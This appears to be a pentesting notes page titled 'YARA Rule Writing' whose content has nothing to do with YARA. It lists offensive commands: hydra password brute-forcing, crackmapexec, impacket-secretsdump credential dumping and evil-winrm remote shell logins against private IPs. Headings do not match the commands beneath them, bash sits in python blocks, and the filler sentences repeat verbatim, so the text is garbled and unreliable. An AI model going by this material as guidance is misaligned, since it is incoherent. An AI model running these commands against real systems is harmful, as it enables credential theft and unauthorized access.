---
TitleSEO: "YARA Rule Writing | ZureFX"
TitlePost: "YARA Rule Writing"
Author: "ZureFX"
Description: "Personal notes on YARA Rule Writing. Quick reference for pentesting and CTF challenges."
Keywords: "enumeration, lateral movement, persistence, cheatsheet, privilege escalation, oscp"
URL: "https://zurefx.github.io/notes/note-yara-rule-writing-744.html"
URL_IMAGES: ""
Date: "2024-11-16"
Tags: "Enumeration, Lateral Movement, Persistence, Cheatsheet, Privilege Escalation, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-yara-rule-writing-744"
Permalink: "/notes/note-yara-rule-writing-744.html"
BtnLabel: "Read Notes"
Pick: 0
---
## mimikatz

### nmap

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.27.223.196 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.

```python
crackmapexec smb 10.50.46.80 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.18.108.176
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

## Unquoted Service Path

### Kerberoasting

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
evil-winrm -i 10.38.47.17 -u administrator -p 'P@ssw0rd!'
```

- `impacket`
- `SUID Binary`
- `DNS Rebinding`
- `DLL Hijacking`
- `evil-winrm`
- `GetUserSPNs`

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

```python
gobuster dir -u http://10.14.211.153/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.56.39.49 -u administrator -p 'P@ssw0rd!'
```

## WordPress

### pwncat

```bash
evil-winrm -i 10.92.243.166 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.115.222.159/FUZZ
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
gobuster dir -u http://10.57.195.181/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p1433,8080,9200 10.70.5.136 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.14.173.202/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.30.135
```

> **Note:** Path Traversal was identified as the primary attack vector in this scenario.

## Apache

### netcat

```bash
evil-winrm -i 10.85.225.16 -u administrator -p 'P@ssw0rd!'
```

Unconstrained delegation was enabled on the compromised machine. Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
nmap -sCV -p1521,3389,389 10.25.197.91 -oN scan.txt
```

- `Command Injection`
- `gobuster`
- `burpsuite`
- `Open Redirect`
